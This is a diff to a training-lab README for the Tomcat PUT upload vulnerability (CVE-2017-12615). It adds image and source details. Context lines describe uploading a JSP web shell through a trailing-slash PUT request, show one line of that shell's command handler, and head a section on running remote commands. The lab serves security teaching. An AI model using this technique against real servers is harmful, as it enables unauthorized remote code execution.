@@ -9,6 +9,8 @@ Under normal circumstances, Tomcat prevents uploading `.jsp` or `.jspx` executab
 - **Primary Interface**: `http://localhost:8129`
 - **Docker Shortcut**: `./lab start tomcat-put-rce`
 - **Container Name**: `cyberlab_02_tomcat_put_rce`
+- **Upstream Image**: `vulhub/tomcat:8.5.19`
+- **Source of Truth**: [Vulhub Tomcat CVE-2017-12615](https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2017-12615)
 - **RAM Footprint**: ~200 MB
 
 ---
@@ -16,6 +18,7 @@ Under normal circumstances, Tomcat prevents uploading `.jsp` or `.jspx` executab
 ## Exploitation Walkthrough
 
 ### 1. Uploading Web Shell via HTTP PUT
+
 Send an HTTP `PUT` request with a trailing slash to bypass the `.jsp` filter:
 
 ```bash
@@ -41,6 +44,7 @@ if (request.getParameter("cmd") != null) {
 Tomcat responds with `HTTP/1.1 201 Created` or `HTTP/1.1 204 No Content`.
 
 ### 2. Executing Remote Commands
+
 Access the uploaded JSP web shell in the browser or via curl:
 
 ```bash
